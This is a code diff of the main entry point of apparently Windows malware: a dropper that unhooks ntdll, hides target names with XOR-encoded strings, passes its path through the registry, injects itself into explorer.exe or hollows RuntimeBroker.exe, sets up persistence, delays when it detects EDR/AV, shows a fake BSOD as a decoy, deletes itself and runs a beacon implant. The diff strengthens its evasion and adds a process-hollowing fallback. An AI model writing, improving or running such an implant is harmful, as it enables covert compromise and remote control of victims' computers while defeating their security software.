@@ -17,14 +17,12 @@
 #include <thread>
 
 namespace {
-    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
-    std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";
-
-    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
-    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
-
-    // "DropperPath" -> \x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32
-    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
+    // XOR Encrypted Strings (Key 0x5A)
+    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
+    const wchar_t kSvchostEnc[] = { 's'^0x5A, 'v'^0x5A, 'c'^0x5A, 'h'^0x5A, 'o'^0x5A, 's'^0x5A, 't'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // svchost.exe
+    const wchar_t kVolatileEnvEnc[] = { 'V'^0x5A, 'o'^0x5A, 'l'^0x5A, 'a'^0x5A, 't'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, ' '^0x5A, 'E'^0x5A, 'n'^0x5A, 'v'^0x5A, 'i'^0x5A, 'r'^0x5A, 'o'^0x5A, 'n'^0x5A, 'm'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A }; // Volatile Environment
+    const wchar_t kDropperPathEnc[] = { 'D'^0x5A, 'r'^0x5A, 'o'^0x5A, 'p'^0x5A, 'p'^0x5A, 'e'^0x5A, 'r'^0x5A, 'P'^0x5A, 'a'^0x5A, 't'^0x5A, 'h'^0x5A }; // DropperPath
+    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x5A, 'u'^0x5A, 'n'^0x5A, 't'^0x5A, 'i'^0x5A, 'm'^0x5A, 'e'^0x5A, 'B'^0x5A, 'r'^0x5A, 'o'^0x5A, 'k'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // RuntimeBroker.exe
 
     std::vector<uint8_t> GetSelfImage() {
         wchar_t path[MAX_PATH];
@@ -41,19 +39,27 @@ namespace {
     }
 
     bool IsSystemProcess(const std::wstring& sPath) {
-        if (sPath.find(utils::DecryptW(kExplorer)) != std::wstring::npos) return true;
-        // "svchost.exe" -> \x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F
-        if (sPath.find(utils::DecryptW(L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F")) != std::wstring::npos) return true;
+        std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
+        std::wstring svchost = utils::DecryptW(kSvchostEnc, 11);
+        std::wstring runtimeBroker = utils::DecryptW(kRuntimeBrokerEnc, 17);
+
+        for (auto& c : explorer) c = (wchar_t)::towlower(c);
+        for (auto& c : svchost) c = (wchar_t)::towlower(c);
+        for (auto& c : runtimeBroker) c = (wchar_t)::towlower(c);
+
+        if (sPath.find(explorer) != std::wstring::npos) return true;
+        if (sPath.find(svchost) != std::wstring::npos) return true;
+        if (sPath.find(runtimeBroker) != std::wstring::npos) return true;
         return false;
     }
 
     bool IsRunningFromPersistLocation(const std::wstring& sPath) {
-        // Robust check: Is it in AppData or ProgramData AND NOT in Temp?
-        bool inAppData = (sPath.find(L"\\appdata\\local\\") != std::wstring::npos || sPath.find(L"\\appdata\\roaming\\") != std::wstring::npos);
-        bool inProgramData = (sPath.find(L"\\programdata\\") != std::wstring::npos);
-        bool inTemp = (sPath.find(L"\\temp\\") != std::wstring::npos || sPath.find(L"\\tmp\\") != std::wstring::npos);
-
-        if ((inAppData || inProgramData) && !inTemp) return true;
+        if (sPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
+            sPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
+            if (sPath.find(L"\\temp\\") == std::wstring::npos && sPath.find(L"\\tmp\\") == std::wstring::npos) {
+                return true;
+            }
+        }
         return false;
     }
 }
@@ -61,91 +67,127 @@ namespace {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
-    // 1. Unhook immediately
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
 
     wchar_t currentPathBuf[MAX_PATH];
     GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
     std::wstring currentPath(currentPathBuf);
-    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+    for (auto& c : currentPath) c = (wchar_t)::towlower(c);
 
     LOG_INFO("--- WINMAIN ---");
-    LOG_INFO("PATH: " + utils::ws2s(currentPath));
+    LOG_INFO("Process: " + utils::ws2s(currentPath));
 
-    Sleep(10000 + (GetTickCount() % 10000));
+    // Priority 1: Check if we are a Foothold (injected/hollowed)
+    if (IsSystemProcess(currentPath)) {
+        LOG_INFO("ROLE: Foothold.");
+        LOG_INFO("Path matched system process. Initiating beaconing...");
+        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+        if (FAILED(hr)) return 1;
+
+        wchar_t dropperPath[MAX_PATH] = {0};
+        HKEY hKey;
+        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
+        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD sz = sizeof(dropperPath);
+            if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
+                LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
+                Sleep(5000); // Short delay before persistence
+                persistence::establishPersistence(dropperPath);
+            }
+            RegCloseKey(hKey);
+        } else {
+            persistence::ReinstallPersistence();
+        }
+        LOG_INFO("Starting beacon loop...");
+        beacon::Beacon implant;
+        implant.run();
+        CoUninitialize();
+        return 0;
+    }
+
+    // Priority 2: Check if we are running from a persisted location
+    if (IsRunningFromPersistLocation(currentPath)) {
+        LOG_INFO("ROLE: Persisted.");
+        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+        if (FAILED(hr)) return 1;
+        beacon::Beacon implant;
+        implant.run();
+        CoUninitialize();
+        return 0;
+    }
+
+    // ROLE: Dropper
+    LOG_INFO("ROLE: Dropper.");
+
+    // EDR/AV Detection and Delay only for dropper
+    int jitter = evasion::Detection::GetJitterDelay();
+    if (jitter > 0) {
+        LOG_WARN("EDR/AV detected. Sleeping for " + std::to_string(jitter) + "s");
+        Sleep(jitter * 1000);
+    } else {
+        Sleep(10000 + (GetTickCount() % 10000));
+    }
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) return 1;
 
-    if (IsSystemProcess(currentPath)) {
-        LOG_INFO("ROLE: Foothold.");
-
-        wchar_t dropperPath[MAX_PATH] = {0};
-        HKEY hKey;
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            DWORD sz = sizeof(dropperPath);
-            if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
-                LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
-                Sleep(30000);
-                persistence::establishPersistence(dropperPath);
-            }
-            RegCloseKey(hKey);
-        }
-
-        beacon::Beacon implant;
-        implant.run();
-        CoUninitialize();
-        return 0;
-    }
-
-    if (IsRunningFromPersistLocation(currentPath)) {
-        LOG_INFO("ROLE: Persisted.");
-        beacon::Beacon implant;
-        implant.run();
-        CoUninitialize();
-        return 0;
-    }
-
-    // Dropper instance
-    LOG_INFO("ROLE: Dropper.");
-
+    // Dropper Instance IPC: Store self path for foothold
     HKEY hKey;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
+    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
+    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        if (RegSetValueExW(hKey, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
+             LOG_INFO("IPC: Stored path successfully.");
+        }
         RegCloseKey(hKey);
-        LOG_INFO("IPC: Stored path.");
     }
 
     std::vector<uint8_t> selfImage = GetSelfImage();
-    bool relocated = false;
     if (!selfImage.empty()) {
-        LOG_INFO("Attempting relocation...");
+        LOG_INFO("Attempting stealth relocation...");
+
+        // Strategy 1: Inject into explorer.exe (Most stable)
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Relocation success.");
-            relocated = true;
+            LOG_INFO("Injection success. Waiting for foothold...");
+            decoy::ShowBSOD();
+            LOG_INFO("Decoy exit. Cleaning up dropper.");
+            CoUninitialize();
+            utils::SelfDeleteAndExit();
+            return 0;
+        }
+
+        // Strategy 2: Hollow RuntimeBroker.exe
+        LOG_WARN("Injection failed. Trying RuntimeBroker hollowing...");
+        wchar_t systemPath[MAX_PATH];
+        GetSystemDirectoryW(systemPath, MAX_PATH);
+        std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
+        std::wstring target = std::wstring(systemPath) + L"\\" + rb;
+
+        LOG_INFO("Hollowing target: " + utils::ws2s(target));
+        if (evasion::Injector::HollowProcess(target, selfImage)) {
+            LOG_INFO("Relocation successful.");
+            decoy::ShowBSOD();
+            CoUninitialize();
+            utils::SelfDeleteAndExit();
+            return 0;
         }
     }
 
-    if (relocated) {
-        decoy::ShowBSOD();
-        CoUninitialize();
-        utils::SelfDeleteAndExit();
-        return 0;
+    LOG_WARN("Relocation failed completely. Launching stable copy.");
+    std::wstring persistPath = persistence::establishPersistence();
+    if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
+        LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
+        STARTUPINFOW si; PROCESS_INFORMATION pi;
+        RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
+        if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            LOG_INFO("Stable copy launched.");
+        }
     }
 
-    LOG_WARN("Relocation failed. Becoming beacon.");
-    persistence::establishPersistence();
-
-    // Run beacon in background during BSOD
-    std::thread beaconThread([]() {
-        beacon::Beacon implant;
-        implant.run();
-    });
-    beaconThread.detach();
-
     decoy::ShowBSOD();
-
     CoUninitialize();
     utils::SelfDeleteAndExit();
     return 0;
